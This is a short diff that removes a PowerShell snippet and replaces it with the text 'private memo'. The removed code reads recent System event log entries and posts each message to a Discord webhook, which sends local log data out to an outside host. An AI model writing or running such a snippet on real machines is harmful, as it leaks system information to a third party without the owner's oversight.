@@ -1,4 +1,1 @@
-Get-WinEvent -LogName System -MaxEvents 5 | ForEach-Object {
-  $msg = "$($_.TimeCreated) - $($_.Message)"
-  Invoke-RestMethod -Uri "https://discord.com/api/webhooks/" -Method POST -Body (@{content=$msg} | ConvertTo-Json) -ContentType "application/json"
-}
+private memo
